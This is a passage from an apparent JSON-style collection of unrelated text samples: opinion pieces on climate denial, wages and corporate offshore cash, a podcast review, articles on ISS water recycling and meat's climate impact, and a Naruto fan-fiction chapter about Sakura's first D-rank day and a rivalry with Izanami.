few years and drawn the obvious conclusion.\n\nBut damn, it’s a hard fight, up against a ton of money and a ton of inertia. Eventually, climate denial will “lose,” because physics and chemistry are not intimidated even by Lord Monckton. But timing is everything — if he and his ilk, a crew of certified planet wreckers, delay action past the point where it can do much good, they’ll be able to claim one of the epic victories in political history — one that will last for geological epochs.",
  "latent_30606": "Pod-Canon is an ongoing tribute to the greatest individual comedy-related podcast episodes of all time.\n\nThis has been a very strange, rollercoaster month or so for fans of Hayes Davenport and Sean Clements’ feverishly adored cult podcast Hollywood Handbook. The Earwolf bad boys have been talking how bad, exhausted, worn out, and comedically threadbare they find their podcast even more than usual as of late.\n\nTo that end, they vowed to end the podcast after its 200th episode. Of course, it’s foolish to take anything Hayes and Sean say face value. They operate under so many layers of irony that it’s difficult to tell whether they’re being sincere, if ever. True, Tom Scharpling of The Best Show, who figures so prominently in Hollywood Handbook’s mythology that he’s practically a third host, also alluded to the end of Hollywood Handbook on his own show but for longtime fans of both podcasts that really just meant that if, in fact, the death/end of Hollywood Handbook is an elaborate joke, then he’s also in on it, as you would expect him to be.\n\nHollywood Handbook went so far as to have posters made up commemorating their podcast’s death featuring a headstone with the podcast’s name on it and the years of its seemingly too brief but glorious existence. That, friends, is what you call really committing to a bit. Because if Hollywood Handbook doesn’t end in 2017, then that poster is a goddamn liar and Hollywood Handbook is nothing if not committed to bold, brash, unadorned honesty.\n\nSo I was surprised, if not exactly shocked, to discover that the week after its ostensible final episode, Hollywood Handbook released two episodes, one a hilarious sex-themed live episode with a bone-dry Kumail Nanjiani (no crude pun intended) that was previously available on Stitcher Premium, and the other with Maria Blasucci and The Complete Woman’s Amanda Lund. For an ostensibly dead podcast, Hollywood Handbook seems awfully active, but one Hollywood Handbook-related project does, indeed, seem to have run its course in the form of Hollywood Masterclass, a Stitcher Premium original that finds Sean Clements going solo in a mini-series where he adopts the role of an eccentric acting guru counseling a baffled and grumpy student Ben Rodgers.\n\nInstead of changing the tone or aesthetic of Hollywood Handbook, Sean’s solo mini-series instead narrows its focus to concentrate on a particularly ridiculous, fertile element of show business narcissism, in this case the craft of acting. Hollywood Handbook doesn’t really have a straight man but in Hollywood Masterclass Rodgers deftly plays the role. He’s the listener surrogate gamely struggling to make sense of his teacher’s frequently nonsensical and often flat-out destructive and offensive advice. The dynamic at play here is an old, familiar one: the bogus guru and the disgruntled would-be protege. Think Anger Management the film or TV show, only, you know, funny.\n\nThe mini-series finds Clements dragging Rodgers through six more or less hour-long classes with pompous titles like, “The Role of the Artist,” “Mastering the Monologue,” and “Acting Without a Net.” Rodgers begins the mini-series in a state of low-level aggravation, and grows more and more enraged as Clements leads him further and further astray.\n\nIn “Mastering the Monologue,” for example, Clements gives his pupil a monologue from Hall Pass to read that gets funnier and funnier with repetition as it moves farther and farther away from its original context as a crowd-pleasing, writerly speech from a mostly forgotten Farrelly Brothers comedy and into the realm of anti-comedy. Hollywood Masterclass gets bigger and more laughs just out of the earnest ways Rodgers pronounces the part of the Hall Pass monologue about how the genius of the Hall Pass idea is that it would empower unhappy married men to “get some strange” than many comedy podcasts do cumulatively over the course of their entire run.\n\nHollywood Masterclass is a beautiful showcase for the prickly comic genius of Clements, and a more low-key one for the superior straight man stylings of Rodgers, but Clements brings in ringers like Hayes Davenport and Paul Scheer as guest lecturers to further confuse and frustrate Rodgers with staggeringly unhelpful advice about money and head shots and improvisation. The ridiculousness of actors and acting as an art form is not the freshest or most novel topic for satire, but just as Hollywood Handbook manages to scathingly and consistently lampoon show business without falling into many of the traps of show business-centered comedy, Hollywood Masterclass attacks acting from unexpected, new, and most importantly, very funny angles.\n\nAs the past few weeks have proven, it’s hard to know exactly where Hollywood Handbook and the partnership of Hayes Davenport and Sean Clements is headed in the future, but their past is full of some of the biggest and most consistent laughs in all of podcasting, as a duo and separately, in addition to famously also being nice, smart, fun, funny and cool.\n\nNathan Rabin is a father, the author of 5 books, a columnist and the proprietor, owner, Editor-in-Chief and sole writer for Nathan Rabin’s Happy Place, which can be found at nathanrabin.com.",
  "latent_30674": "Transporting anything to the space station is extremely expensive—launching a SpaceX rocket costs more than $1800 per pound. And you know what’s really heavy? Water.\n\nTanks of H20 can't be constantly shipped up to the International Space Station, so the station has a complex water system that squeezes every last drop of available, drinkable liquid out of the environment. That leaves astronauts drinking a filtered mixture that includes recycled shower water, old astronaut sweat, and pee. The station also keeps about 530 gallons of water in reserve in case of an emergency.\n\nThe NASA water systems on the ISS collect moisture from breath and sweat, urine from people and research animals, and runoff from sinks and showers to keep the station hydrated. “It tastes like bottled water, as long as you can psychologically get past the point that it’s recycled urine and condensate that comes out of the air,” Layne Carter, who manages the ISS water system from the Marshall Flight Center in Alabama, told Bloomberg Businessweek.\n\nHowever, not all the ISS astronauts drink recycled urine. The ISS is split into two sections, one run by Russia, and one by the United States, and they have two different water systems. The U.S. system collects condensate, runoff, and urine to create about 3.6 gallons of drinkable water per day. However, the Russian astronauts drink water processed from only shower runoff and condensate, skipping the urine (producing slightly less than that 3.6 gallons). Occasionally, the NASA astronauts will go over to the Russian side of the ISS and grab the Russian supplies of urine to process it themselves. No need to waste potential water supplies!\n\nIn addition, the two sides of the ISS disinfect their water two different ways. Since 1981, NASA has been using iodine to disinfect water, a process that requires the water to be filtered since too much iodine can cause thyroid issues. Russia has been using silver to disinfect its water since the launch of the Mir station by the Soviet Union in 1986.\n\n[h/t: Bloomberg Businessweek]",
  "latent_30847": "Solid job growth but sluggish wage growth has been a constant refrain over the last few months. We’ve finally seen 12 consecutive months of job growth above 200,000, but wage growth shows little sign of accelerating. The question that everyone seems to be asking now is, when will wage growth pick up?\n\nIn the last couple of weeks, we’ve seen some employers take a step forward and make a choice to pay higher wages. Corporate profits are near all-time highs, so employers can pay their workers more without having to raise prices. They might even find that workers who are paid more have more company loyalty, leading to better recruitment and retention, and higher productivity. It’s a reminder that the path we’ve chosen—one where economic gains are disproportionately enjoyed by those at the top—is a choice.\n\nPolicy can help turn this around. Minimum wage increases across the country are a good example. In 2014, 18 states, where 47 percent of all U.S. workers reside, increased their minimum wage. And this change made a difference: while real hourly wages fell or stagnated across the board last month, low wage workers actually saw a modest wage increase.\n\nSo, policy matters, as does a tight labor market. And, today, while we’re solidly adding jobs, there is still tremendous slack in the labor market. There are nearly 6 million missing workers, who have yet to enter or return to the labor force. The quits rate has yet to recover; a larger number of people voluntarily quitting their jobs indicates a strong labor market—one where workers are able to leave jobs that are not right for them and find new ones.\n\nIn short, we’re still far enough away from full employment that additional fiscal stimulus would pay big dividends. This is unfortunately not on the table, politically speaking, though economically it would be relatively easy. But it’s important that policymakers—particularly those at the Federal Reserve—not put the brakes on the recovery prematurely. Nominal wage growth in February was 2.0 percent for the nonfarm private sector over the year, and an even lower 1.6 percent among production and nonsupervisory employees. As shown in the figure below, wage growth has been flitting around 2 percent for nearly five years now.\n\nThe horizontal shaded area represents growth of 3.5 to 4 percent—nominal wage growth consistent with the Fed’s 2 percent inflation target and a stable labor share of income (given a range of 1.5 to 2 percent trend productivity growth). We need to see consistent wage growth above this range before we’ll see a hint of upward pressure on prices. In other words, the Fed should not even consider raising interest rates to forestall inflation until wage growth is consistently above this target. Consistently strong job growth will eventually lead to a tighter labor market that generates faster wage-growth, but we are not there yet, and policy should stay supportive of growth until we are.",
  "latent_30976": "By Richard Black\n\nEnvironment correspondent, BBC News website\n\nLivestock production has a bigger climate impact than transport, the UN believes\n\nPeople should consider eating less meat as a way of combating global warming, says the UN's top climate scientist. Rajendra Pachauri, who chairs the Intergovernmental Panel on Climate Change (IPCC), will make the call at a speech in London on Monday evening. UN figures suggest that meat production puts more greenhouse gases into the atmosphere than transport. But a spokeswoman for the UK's National Farmers' Union (NFU) said methane emissions from farms were declining. People may not realise that changing what's on their plate could have an even bigger effect\n\nJoyce D'Silva\n\nCompassion in World Farming Dr Pachauri has just been re-appointed for a second six-year term as chairman of the Nobel Prize-winning IPCC, the body that collates and evaluates climate data for the world's governments. \"The UN Food and Agriculture Organization (FAO) has estimated that direct emissions from meat production account for about 18% of the world's total greenhouse gas emissions,\" he told BBC News. \"So I want to highlight the fact that among options for mitigating climate change, changing diets is something one should consider.\" Climate of persuasion The FAO figure of 18% includes greenhouse gases released in every part of the meat production cycle - clearing forested land, making and transporting fertiliser, burning fossil fuels in farm vehicles, and the front and rear end emissions of cattle and sheep. Dr Pachauri has chaired the Nobel Prize-winning body since 2002 The contributions of the three main greenhouse gases - carbon dioxide, methane and nitrous oxide - are roughly equivalent, the FAO calculates. Transport, by contrast, accounts for just 13% of humankind's greenhouse gas footprint, according to the IPCC. Dr Pachauri will be speaking at a meeting organised by Compassion in World Farming (CIWF), whose main reason for suggesting people lower their consumption of meat is to reduce the number of animals in factory farms. CIWF's ambassador Joyce D'Silva said that thinking about climate change could spur people to change their habits. \"The climate change angle could be quite persuasive,\" she said. \"Surveys show people are anxious about their personal carbon footprints and cutting back on car journeys and so on; but they may not realise that changing what's on their plate could have an even bigger effect.\" Side benefits There are various possibilities for reducing the greenhouse gas emissions associated with farming animals. They range from scientific approaches, such as genetically engineering strains of cattle that produce less methane flatus, to reducing the amount of transport involved through eating locally reared animals. \"The NFU is committed to ensuring farming is part of the solution to climate change, rather than being part of the problem,\" an NFU spokeswoman told BBC News.\n\nUnnatural roots of the food crisis Snared in a homemade 'NitroNet' Send us your comments \"We strongly support research aimed at reducing methane emissions from livestock farming by, for example, changing diets and using anaerobic digestion.\" Methane emissions from UK farms have fallen by 13% since 1990. But the biggest source globally of carbon dioxide from meat production is land clearance, particularly of tropical forest, which is set to continue as long as demand for meat rises. Ms D'Silva believes that governments negotiating a successor to the Kyoto Protocol ought to take these factors into account. \"I would like governments to set targets for reduction in meat production and consumption,\" she said. \"That's something that should probably happen at a global level as part of a negotiated climate change treaty, and it would be done fairly, so that people with little meat at the moment such as in sub-Saharan Africa would be able to eat more, and we in the west would eat less.\" Dr Pachauri, however, sees it more as an issue of personal choice. \"I'm not in favour of mandating things like this, but if there were a (global) price on carbon perhaps the price of meat would go up and people would eat less,\" he said. \"But if we're honest, less meat is also good for the health, and would also at the same time reduce emissions of greenhouse gases.\" Richard.Black-INTERNET@bbc.co.uk\n\nE-mail this to a friend Printable version Bookmark with: Delicious\n\nDigg\n\nreddit\n\nFacebook\n\nStumbleUpon What are these?",

Here are two pieces of news that might help explain.\n\nFirst, your chief financial officers shipped $206 billion in cash to overseas tax shelters last year, Bloomberg reported on Wednesday. The total amount of cash held in offshore havens rose to $1.95 trillion, according to Bloomberg, which is more than the combined market values of the six biggest companies in the U.S.\n\n(Fun fact: Some of those six companies are also major hoarders of offshore cash -- Apple, Exxon, Google and GE alone have $250 billion parked offshore, according to Bloomberg.)\n\nTo add insult to injury, or maybe injury to injury, corporate CFOs are also staunchly opposed to raising the minimum wage, according to a new survey by Duke University and CFO Magazine.\n\nTim Cook, CEO of Apple, which has one of Corporate America's largest stockpiles of overseas cash.\n\nAbout 39 percent of the 216 U.S. CFOs surveyed said they would cut jobs if the minimum wage were higher, including nearly 57 percent of CFOs in the retail industry and 40 percent of manufacturing CFOs. These companies are worried that having to pay their lowest-paid workers slightly more will crush their profits.\n\nMeanwhile, corporate profits are at record highs, and worker wages have not budged for decades, when adjusted for inflation.\n\nThe CFO survey is not scientific, given its small sample size. And it is encouraging that 61 percent of CFOs said they wouldn't cut jobs if the minimum wage were higher. In fact, many studies have suggested that a higher minimum wage would result in little or no job loss.\n\nOne exception is a recent study by the Congressional Budget Office, which estimated that raising the federal minimum wage to $10.10 an hour from $7.25 an hour would kill 500,000 jobs.\n\nBut a higher minimum wage would also lift 900,000 people out of poverty, according to that CBO study, and give consumers $28 billion per year to spend, boosting the broader economy, according to a separate Chicago Federal Reserve study.\n\nA higher minimum wage could save the U.S. government $4.6 billion in food-stamp costs every year, according to a study by the Center For America Progress.\n\nMeanwhile, those corporate cash-hoarders -- America's true welfare queens -- are costing the U.S. government between $30 billion and $90 billion in revenue every year, according to a 2013 study by the Congressional Research Service.",

  "latent_31826": "If you try to take a cat apart to see how it works, generally the first thing you have on your hands is a cat that doesn't work.\n\nI awoke to a pounding headache, my consciousness unwillingly forced upon me before I could get out of the way, as if rising up from some deeper, safer level where it had taken refuge. There was a light which was almost sickening in its intensity. Why was there light? The very concept of light felt like a travesty to all that was good and right in the world.\n\n\"Gooood morning, Sakura!\" a voice chirped brightly, hammering against my eardrums, and I moaned in protest. My brain was going to fall out of my skull any second. My head would crack like the shell of an egg and my brain would slip out like yolk, dripping down onto the floor and bringing a merciful end to things. The thought was strangely comforting.\n\n\"Go 'way, dad...\" I groaned into what I realized must be some sort of pillow. \"'S not funny...\"\n\n\"I'm flattered that you've already grown so fond of me, Sakura,\" the voice said, \"but I think your father would take offense.\"\n\nI blinked open crusty eyelids and winced them shut again as unfiltered, searing light penetrated to my innards. I tried swallowing and immediately regretted it-my throat was dry like sandpaper and my mouth felt like the decrepit mausoleum of an ancient, forgotten horror. I lifted my head slightly, and the world lifted dizzyingly with it. I groaned, immediately letting it fall back down again.\n\n\"There's a lesson to be learned somewhere here, I'm sure...\" the voice mused. \"I wonder what it is...\"\n\nI ignored it, willing it to go away. There was silence for a blessed time, and then something jabbed me sharply in the shoulder.\n\n\"I brought water,\" the voice said.\n\nWater. Yes. Wait, water was a fluid. No.\n\n\"Come on, now, we haven't got all day.\"\n\nI inched open my eyes again, enduring the throb in my head that came every time my gaze moved. It took a moment to realize that I was in my room, lying in my bed. I took a deep breath, then slowly sat up, working my way through the requisite muscles one by one and reactivating them with conscious effort. After I'd adjusted somewhat to the light, I lifted my head to look around.\n\nKakashi was crouching at the foot of my bed-in my bed. I yelped and flinched back, then suddenly ran out of bed on my left side and plummeted sideways with a strangled screech, crashing to the floor. Body and mind screamed in protest at the same time, and for a moment all of my attention was consumed with forcing down the instinct to be sick right then and there. It slowly subsided and my mind turned back to less immediate concerns.\n\n\"What the fuck,\" I choked, my cheek pressed against the cold wooden floor. It belatedly occurred to me that I at least had all of my clothes on - for some reason. I sat up and immediately grabbed my head, moaning. I pushed through the queasy pain and glared up at Kakashi, squinting against the light from the open window behind him. He gave me a small, insensibly cheerful wave.\n\n\"What are you doing here?\" I demanded hoarsely.\n\n\"Oh, just checking in with one of my students,\" he said and picked up a glass of water from the windowsill behind him, holding it out towards me. \"Drink?\"\n\nI ignored the glass. \"You're in my room. You broke into my room.\"\n\n\"It's a very nice room.\"\n\n\"Why are you in my room?\"\n\n\"For a lot of reasons, some of them better than others.\"\n\nI stared at him, mute, then dropped my head into my hands with a small groan, fingers rubbing my forehead.\n\n\"Did my parents let you in...?\" I asked. If so, I needed to have a serious word with them.\n\n\"Oh, no, they're in the kitchen, having breakfast.\"\n\nI looked up, squinting. \"You mean they don't know that you're here?\"\n\nHe shrugged. \"I suppose that's true.\"\n\nI stared at him with morbid fascination. \"You must be the creepiest, weirdest sensei... ever.\"\n\n\"Thank you.\"\n\n\"It wasn't a-\" I stopped myself. No point.\n\nKakashi bent down and set the glass of water in front of me. \"You should really drink a bit, you know. It's not just water, there's all kinds of things in there. Everything the body needs after a decent night out on the town.\"\n\n\"Decent...?\" I asked, pressing my hands against my eyes - the pressure felt relieving. \"You're joking, right?\"\n\n\"I'm afraid not.\"\n\n\"I'm never having a 'night out on the town' again. Ever.\"\n\n\"Very good. Now drink.\"\n\nWith a sigh, I let my hands drop, folded my legs together, took the glass of water and raised it to my lips. I grimaced; the taste was sour and bitter at the same time. About halfway through, I had to stop and put the back of my hand to my mouth as my stomach rebelled against the introduction of new elements. I held the glass in my lap while resisting the urge to regurgitate what I'd already drunk, and shot a withering glare at Kakashi.\n\n\"Okay,\" I muttered. \"Explanations.\"\n\nHe nodded. \"I already woke up Izanami and Naruto. They should be meeting us outside within ten minutes or so. That's how long you have to clean up and get dressed for your first D-rank.\"\n\nI stared at him, for long seconds. \"You're joking.\"\n\n\"Not even slightly.\"\n\n\"You said today was off.\"\n\nHe shook his head. \"No, I said the Administration said today was off.\"\n\nAnd clearly, there is a difference between what the Administration says and what Kakashi says.\n\nI experimentally took another sip of the glass and grimaced, setting it down again. I had to admit that it was helping a little - I still felt half a second away from throwing up, but my head was steadying a bit.\n\nI cleared my throat. \"I suppose we all volunteered to start early and the paperwork saying so is all in order, signed by...\" I eyed him suspiciously.\n\n\"Yours truly,\" he confirmed.\n\n\"Of course.\" I was beginning to get a sense of my new sensei, oh yes. \"And I further suppose...\" I growled \"...that, were I to raise a fuss and tell you to stick your D-rank up where the light does not shine... it would not reflect well on my record.\"\n\n\"Insubordination tends to be slightly frowned upon, yes,\" he said mildly.\n\nWith a sigh, I slowly maneuvered myself to my legs, joints popping and creaking and making me feel like an elderly. I took a deep, slow breath, calming myself and firmly suppressing the impulse to try and punch my sensei in the face. Instead I just cracked my knuckles and stretched glumly, barely managing to not fall over backwards in the process. Then I headed for the bathroom, to see what could be done in ten minutes. More like eight, now.\n\nI took a lightning shower, which was mostly two minutes of banging my head-gently-against the tiled wall to wake up while I turned the temperature down from burning hot to freezing cold, and dressed in fresh clothes. I returned to my room to find Kakashi looking at a couple of papers over by my workshop in the corner.\n\n\"What are you doing?!\" I demanded.\n\n\"You really did fix the timing issue. Huh.\"\n\nI sped across the room in a single chakra-boosted motion, making a grab for the papers. He reached out backwards and grabbed my arm without even looking, and I stopped dead in my tracks, just like that. I blinked. What the hell had that been? Some sort of momentum-stopping technique? Would that work on yourself? I could see some uses for that. I almost lost track of why I'd been angry before I remembered to glare furiously at Kakashi.\n\n\"Easy,\" he said. \"I was just doing a little thing for ANBU. I'm not stealing anything, nor telling anyone how it works, not that I understand it completely myself.\"\n\nThe effect of hearing that was like being doused in icy water. \"ANBU?\" I asked warily. What did Konoha's black ops forces want with my notes?\n\nKakashi released my arm and I stepped back, rubbing it where he'd gripped it. He looked once more at the papers he'd held up-old and by now outdated working notes on how part of the triggering mechanism in my explosive scrolls was put together. \"You see, a few people over at ANBU refused to believe that anybody but them had figured out how to do it - they were convinced you'd somehow stolen their research. Luckily, they still listen to me, so they agreed to let me go check it out, just to be sure.\"\n\n\"And...?\" I asked, unable to suppress a sudden, small shiver. I hadn't stolen anything, of course, but with ANBU you never knew; they didn't follow the rules everybody else did. If there was even a coincidental resemblance to how they were doing it...\n\nKakashi nodded down at the papers. \"Well, clearly you didn't steal their method. Their scrolls work in an entirely different way-much more clunky, really, to tell the truth.\" He looked at me, the contour of a wry smile forming beneath his mask. \"So no problem.\"\n\nI breathed out uneasily, almost hesitant to feel relief.\n\n\"There's a lesson to be learned here, by the way,\" Kakashi said, waving at the papers now scattered across my workdesk. \"I did try not to look, but I couldn't help but see some awfully interesting ideas here.\"\n\n\"Yes,\" I said. \"I get it. Anyone can poke their head in my window and look through everything I own at any time, including my work. Gee, I forgot.\"\n\n\"That's a way of putting it.\"\n\nI refrained from shooting him a glare. It was... sort of true, after all. Instead, I stared down at my desk, muttering: \"I'll... fix that. Somehow.\"\n\n\"Good. Now-\" Kakashi stopped and turned to look at the door to the hallway \"-I'll be waiting outside.\" He vanished out the window.\n\nA second later the door opened and my mother poked her head in. Her eyebrows rose when she saw me fully clothed. \"We heard sounds from in here and I went to check,\" she said, a hint of worry in her tone. \"Are you really up already?\"\n\n\"As you can see,\" I said, then sighed and began gathering up my various equipment belts, strapping them on and checking their contents.\n\n\"What's the matter, Sakura?\" my mother asked. \"I didn't think you'd be up for hours yet, the way you were when you came home earlier.\" Her tone turned dangerously airy while her face remained straight, though there was a small gleam in her eye. \"Your father is making grumbling noises about someone not keeping their promises or something in that vein.\"\n\nI'd already opened my mouth to reply when I realized that I had no idea at all what she was talking about-I couldn't even recall how I'd gotten home, let alone when... or much at all from before that. I frowned, trying to remember, but... it was all just a darkish blur after the earlier parts of the evening.\n\nNever again, I told myself firmly. Ever.\n\nI licked my lips and forced a smile for her, hoping it'd do. \"I'm heading to work, mom. I'll be back later.\"\n\n\"Already?\" my mother asked, frowning slightly. \"I thought you weren't starting until tomorrow.\"\n\n\"Well, I'm starting today,\" I said shortly as I rifled through the last equipment pouch. I was still too light on a lot of things, after Kakashi's test-I only had so much cash to spare after all-but this would be enough for D-ranks. My head was another matter; it felt like my skull was playing host to a claustrophobic madman with a demonic sledgehammer.\n\nI suppressed a groan, stepped up onto the windowsill and looked back at my mother. \"I've gotta go...\"\n\n\"Out the window, really, dear?\"\n\n\"Don't... just don't ask.\"\n\nMy mother stared at me for a few moments, then licked her lips. \"Dinner is at six. Will you be home by then?\"\n\n\"I certainly hope so,\" I muttered darkly and swung outside.\n\nIt was fifteen minutes past one when we finally trundled into training ground five. My feet dragged, there probably wasn't a single part of my body that wasn't somehow hurting, and my stomach rumbled every few minutes or so.\n\n\"Where the hell is he?\" Naruto asked.\n\n\"I don't know,\" I said and peered around. Training ground five was mostly used by academy instructors who needed the large, open space, but since the final year students had graduated and the rest of the academy's students were busy with their exams, it was sparsely populated. A few teams I didn't recognize were sparring or doing exercises, here and there, but Kakashi was nowhere to be seen.\n\nHe'd told us to meet him here at one o'clock when we were done helping the Regulars keep the law and order down by a large market fair, but we'd gotten held up subduing a huge drunken brawl that had sprung up out of absolutely nowhere right before we were supposed to be done. And that after an entire day of chasing shoplifters around and breaking up smaller fights while dealing with the mother of all hangovers. Today I had developed a newfound appreciation for the work which the Regular police did - I did not envy them.\n\n\"I guess we'll just have to wait,\" I said, walking over to a nearby tree and sliding down against it with a heavy sigh.\n\nNaruto smiled, sitting down on the grass in the shade of the tree. \"Killer first day, huh?\"\n\n\"Tell me about it,\" I muttered, rubbing my forehead.\n\n\"You do look a little peaked.\"\n\nI looked up at him, then self-consciously scratched the side of my freshly acquired black eye. They'd told me it didn't look too bad, but I wasn't so sure.\n\n\"I'm fine, really,\" I said.\n\nIzanami snorted from where she stood against a nearby tree, arms crossed. I looked at her, trying not to glare. \"Anything you want to say?\"\n\n\"Nope,\" she said airily without looking at me, her gaze sweeping across the training ground.\n\nI stared at her for a few more moments, then leaned my head back against the tree and closed my eyes, sighing again, determined to just enjoy the feeling of sitting down a bit and relaxing.\n\n\"This is ridiculous,\" Izanami said after a timeless interval. I jumped - I must have started dozing off. \"He's twenty-five minutes late,\" she continued.\n\n\"We were fifteen minutes late,\" Naruto pointed out. \"Maybe he, uh, just went out to look for us.\"\n\n\"He should be back by now in that case.\"\n\nI didn't say anything; I had my private suspicions about where exactly Kakashi was, but I wasn't going to just air them out loud here. Izanami could bloody well figure it out on her own.\n\n\"We wouldn't have been late if Sakura hadn't screwed up,\" Izanami muttered after a second.\n\nI sat up straight and looked at her with disbelief. \"Excuse me?\"\n\nShe raised her eyebrows at me. \"What?\"\n\n\"You were the one who stormed in without us, doing your own thing when we were supposed to keep things contained while the police-\"\n\n\"It got the job done in a hurry, didn't it?\" Izanami said. \"What else was I supposed to do? Stand around looking pretty?\"\n\nI realized that my mouth hung open, and belatedly closed it. \"You could have, you know, covered my flank like you were supposed to.\"\n\n\"Girls, girls,\" Naruto broke in. \"Is this really the t-\"\n\n\"Oh, I'm sorry for assuming you wouldn't have any trouble with a bunch of civilians,\" Izanami sneered. \"I realize now that was too much to expect.\"\n\nI almost began to reply hotly, but managed to stop myself short. In every confrontation like this, someone had to keep a cool head or things could quickly get ugly. I didn't want to get into a fight. I glanced aside at Naruto; he was glancing between me and Izanami, looking as if he wasn't certain just how much he was supposed to intervene.\n\nOkay, I told myself, looked back at Izanami and took a deep, shaky breath. It's just a problem like any other. And how do we solve problems? By bringing them out into the open where we can examine them, and then dealing with them.\n\nI squared my shoulders almost without thinking, while trying to figure out how to put this.\n\n\"Okay, what does it take?\" I asked, trying not to let my voice tremble.\n\nIzanami frowned. \"What?\"\n\n\"We've never been on the best of terms. My guess is that ever since you kicked my ass in that first match in third grade, I've been just another annoying little weakling that wasn't worth considering for someone like you. Being on a team with me annoys you because now you have no choice but to deal with me and you don't want to babysit me or make sure I'm alright when you don't think I can keep up, you just want to do the job and get on with it.\"\n\nIzanami's eyebrows had risen by now. She glanced aside at Naruto, who was looking dumbstruck, and then looked around the training field as if to check whether we were being watched, and finally back at me. I almost shivered, for a moment, at the way her cold, dark eyes examined me - there was something vaguely predatory about that look.\n\n\"I'm on the right track, aren't I?\" I asked.\n\nShe considered me curiously for a moment as if waiting for something to happen, then shrugged uncaringly. \"Pretty much.\"\n\n\"So what would it take, to change that?\"\n\nThe corner of her lip twitched. \"I wouldn't even know where to begin.\"\n\n\"You wouldn't even have passed Kakashi's test without me,\" I pointed out, clenching my jaw. Where did she get off, putting it like that? It wasn't even a constructive insult, it was just bloody useless on every level.\n\n\"I'm not so convinced of that.\"\n\n\"It was about teamwork,\" I said. \"If I hadn't gotten us to work together, we'd have failed.\"\n\nAgain, she shrugged. \"We'll never know.\"\n\nI clenched my fist and took a deep, shaky breath, but it was too late.\n\n\"How about this,\" I heard myself say coldly. \"I go ahead and hand you your ass on a platter, and then you'll acknowledge maybe I'm not so useless after all.\"\n\nIzanami smirked at me. \"That would almost be interesting if it wasn't so pathetic. You see, I've already won.\"\n\nShe looked aside at Naruto, and I followed her gaze, then blinked-where the hell was he? Where the hell were we? Grass stretched as far into the horizon as the eye could see. Stunned, I looked back to Izanami, but she too was gone now, and so were the trees around us.\n\nShit, I thought. Genjutsu.\n\nBefore I could react, a gust of wind blew and the grass began to turn to dust before my eyes, revealing cracked, barren dirt beneath. Within moments, I could hardly see for the storm of sand swirling around me - it stung the skin and it was uncomfortable to breathe. Overcoming that brief disorientation, I realized that I was floating; the storm was a void of darkness and swirling colors around me - I had to suppress a shiver of discomfort. The darkness parted like the lid of an opening eye, giving way to the image of a slowly rotating Sharingan that filled the whole world. It never moved, but no matter where I looked, I was always staring straight into its center. Just the thought made my brain hurt.\n\n\"You're not even trying to break it,\" Izanami's voice echoed around me, a hint of disdain tingeing it.\n\nI swallowed, fighting a rising sense of panic. That was because trying would be no use. I could maybe break this illusion, flood my own system with enough chakra to sever Izanami's grip on me, but I'd been too slow already. I hadn't caught it in time, I didn't even know exactly when she'd done it - any of the times I'd actually been stupid enough to look her in the eyes, probably. Silently, I cursed myself. This was a lost battle, if you could even call it a battle at all.\n\n\"I didn't mean now,\" I said.\n\n\"We don't always get to pick our battles,\" Izanami's voice replied. \"You seem to prefer the blunt approach, so be blunt with yourself. Even if I let this genjutsu go without taking advantage, and the two of us faced off right now, who would win?\"\n\nI paused as I considered the answer to that question-actually considered it.\n\n\"I thought so,\" Izanami's voice came when I didn't answer right away. \"When it really comes down to it, you're just a scared little girl who has to go home to daddy when it's l-\"\n\n\"One month.\"\n\nThere was the briefest of pauses. \"What?\"\n\n\"Give me a month and I will kick your ass in a straight-up fight. If I lose, you can call me whatever you want. I'll even admit that I'm weaker than you, and do my best not to get in your way.\"\n\n\"Don't be silly.\"\n\n\"What, afraid you're going to lose?\" I taunted, unable to help myself.\n\n\"I-\"\n\nThe genjutsu was abruptly released, leaving me standing there on the grass in training ground five again. I jumped at the sudden transition and almost stumbled before I got a hold of myself. Izanami was standing right in front of me, considering me with narrowed eyes. Naruto had his hand on her shoulder as if to restrain her, and was staring at me with a worried expression.\n\nThe reason Izanami had released me immediately became apparent when I heard Kakashi's voice. \"Is there a problem, here?\"\n\nWe all turned to look at him, and nobody spoke for a moment. He was carrying a plastic bag - he must have only just arrived.\n\nOr pretended to, anyway.\n\n\"We-\" Naruto began.\n\n\"No,\" I said firmly. They all looked at me, and I shot a glance at Izanami. \"There's no problem at all. Right?\"\n\nShe stared at me, a frown settling onto her face, and our eyes met for a few brief moments. I let them - she wasn't going to try anything again, not right in front of Kakashi. Her expression firmed and she gave me the slightest of nods, and I knew that I had my answer.\n\n\"No,\" Izanami said slowly. \"No problem.\"\n\nKakashi looked between the two of us a few times, then shrugged. \"Okay.\" He held up the bag he was carrying. \"I brought lunch.\"\n\nTen minutes later, we had polished off lunch to the last crumb. I'd been starving, and evidently the same could be said for Naruto and Izanami - we hadn't had time to get anything after that riot, after all, and we'd also been far too busy earlier. Kakashi seemed to have eaten already, and had just sat quietly and waited while we ate.\n\nAt first, even just sitting there and eating had been a tense experience, as if lightning could spark between me and Izanami at any moment. The feeling had slowly disappeared, though, and it felt like everybody had finally calmed down a bit. I certainly had, after the mild state of shock and anger had faded into the occasional tremor as some leftover tension released itself.\n\nI'd been spending the last five minutes silently berating myself for letting my temper get the better of me. A month to take out Izanami? I hadn't the slightest idea how I was going to pull that off. In fact, I was already beginning to doubt that I would - I found my thoughts angling more and more towards how to cope when I inevitably failed.\n\nMaybe I'd have a small chance if it had been six months, or hell, a year - why had I absolutely had to go ahead and say one month? I might as well have said one week, for all the good it would have done me. But for better or worse, one month was the deadline I was now stuck with.\n\nI'd just started wondering what options I could actually explore when Kakashi sat up a little straighter and cleared his throat. We all looked at him.\n\n\"Alright,\" he said. \"I've been studying your grades and Iruka's notes in greater detail. You've each got some personal strengths and weaknesses, and you know what those are. We'll be working on shoring up the weaknesses, of course, and making the strengths stronger-I'll give what help I can there. What I'm thinking is that I'll assign two of you exercises in pairs, and train the remaining person one on one, for an hour at a time. After that, we're going to be trying variations on team exercises like the bell test, with you three against me, until I'm tired of that. Then we can go home.\"\n\nHe looked at Naruto. \"Mostly, it seems like you'd want to work on expanding your repertoire of techniques and refining your chakra control. I've got some ideas for how we can use your... uncommon amounts of chakra - some of them similar to what it seems like you and Izanami have already been doing. We'll see how that pans out.\"\n\n\"Sure,\" Naruto said.\n\nI frowned; I'd almost completely forgotten about that in the midst of everything else. Even so, I stayed silent for now-it wasn't the time, though I really had to get around to asking him what that was all about. I was beginning to doubt I would get answers, too. If I hadn't been told so far, I probably wasn't going to be told at all.\n\nNext, Kakashi turned to Izanami. \"Your progression is rather more obvious. How far is your Sharingan along?\"\n\n\"Second stage in each eye, like you saw,\" she answered tersely.\n\nKakashi nodded. \"We'll 